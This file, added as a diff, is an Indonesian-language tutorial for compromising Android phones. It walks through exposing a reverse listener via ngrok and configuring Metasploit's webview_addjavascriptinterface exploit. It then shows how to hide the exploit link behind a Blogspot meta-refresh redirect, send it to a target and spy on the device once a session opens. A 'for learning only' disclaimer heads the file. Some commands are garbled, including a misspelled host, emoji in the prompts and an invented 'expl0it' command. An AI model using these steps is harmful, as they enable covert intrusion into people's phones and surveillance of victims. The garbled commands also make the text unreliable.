@@ -1,0 +1,80 @@
+Ini hanya untuk pembelajaran saja, tidak untuk kegiatan ilegal
+Author : David Paliwan, S.Kom
+____________________
+|		   |
+|  studi kasus	   |
+|		   | 
+--------------------
+
+mengakses perangkat android atau hp menggunakan teknik exploitasi direct link (masking)
+===========================/ /=========================
+
+==/ step 1 /==
+membuat forwarding ip public, sehingga dapat menjangkau akses beda jaringan
+---------------------------------------------------------------------------
+download dan install ngrok
+https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
+unzip /path/to/ngrok.zip
+---------------------------------------------------------------------------
+./ngrok authtoken xxxxxxxxxxxxxxxxxxxxxxxxx
+------------------------------------------------
+./ngrok http 80
+---------------------
+setelah itu secara otomatis muncul tampilan Session Status.
+0.tcp.ngrok.io adalah LHOST
+dan pada menu web interface terdapat port yang digunakan sebagai LPORT
+membuat akses ke perangkat target
+----------------------------------
+pada command shel/terminal, ketikkan
+services postgresql start
+---------------------------
+
+==/ step 2 /===MEMBUAT BACKDOOR APK===============================================
+msfconsole
+-------------
+msf > use exploit/android/browser/webview_addjavascriptinterface
+------------------------------------------------------------------
+msf exploit(android/browser/webview_addjavascriptinterface) > set SRVHOST 0.tcp.ngrok.io
+-----------------------------------------------------------------------------------------
+msf exploit(android/browser/webview_addjavascriptinterface) > set URIPATH /
+-----------------------------------------------------------------------------
+msf exploit(android/browser/webview_addjavascriptinterface) > set LHOST 0.tcp.ngok.io
+--------------------------------------------------------------------------------------
+msf exploit(android/browser/webview_addjavascriptinterface) > set LPORT 4444
+catatan : LPORT yang digunakan adalah LPORT yang dilihat tadi pada session status
+--------------------------------------------------------------------------------------------
+msf exploit🌜️android/browser/webview_addjavascriptinterface🌛️ > set VERBOSE true
+-------------------------------------------------------------------------------
+msf exploit🌜️android/browser/webview_addjavascriptinterface🌛️ > set ReverseListenerBindAddress 0.tcp.ngrok.io
+------------------------------------------------------------------------------------------------------------
+msf exploit🌜️android/browser/webview_addjavascriptinterface🌛️ > set ReverseListenerBindPort 4444
+-----------------------------------------------------------------------------------------------
+msf exploit(android/browser/webview_addjavascriptinterface) > run
+✅️ Exploit running as background job 0.
+✅️ Started reverse TCP handler on 0.tcp.ngrok.io:4444
+✅️ Using URL: http://0.tcp.ngrok.io:8080
+✅️ Server started.
+msf exploit(android/browser/webview_addjavascriptinterface)>
+catatan : http://0.tcp.ngrok.io:8080 adalah link untuk menyerang target
+------------------------------------------------------------------------
+
+
+
+==/ step 3 /=======MENYAMARKAN LINK AGAR TARGET YAKIN=====================================
+menyediakan blogspot.com sebagai situs hosting link redirect
+masuk ke tema blogger kemudian klik tombol edit_html untuk menempatkan kode redirect link.
+setelah masuk tapilan kode html, cari kode <head> dan tempatkan kode berikut dibawahnya.
+<meta content=0;url=http://0.tcp.ngrok.io:8080 http-equiv=refresh> 
+setelah itu, silahkan kreasikan tampilan blog anda agar menarik perhatian pengunjung.
+-------------------------------------------------------------------------------------
+
+kemudian copy alamat web blog anda contoh kopihitam.blogspot.com kemudian kirimkan ke target.
+setelah target merespon atau mengklik link tersebut maka secara otomatis diarahkan ke link exploitasi.
+handshake atau jaringan yang terhubung akan terlihat di shell terminal.
+sementara proses berjalan, anda mengetikkan dibawah daftar proses >> session -i
+setelah muncul ACTIVE SESSION ketikkan perintah seperti dibawah ini
+msf exploit android/browser/webview_addjavascriptinterface > expl0it
+----------------------------------------------------------------------
+
+akan berlangsung proses exploitasi resource perangkat.
+setelah selesai proses, silahkan masukkan perintah untuk mengintip target.
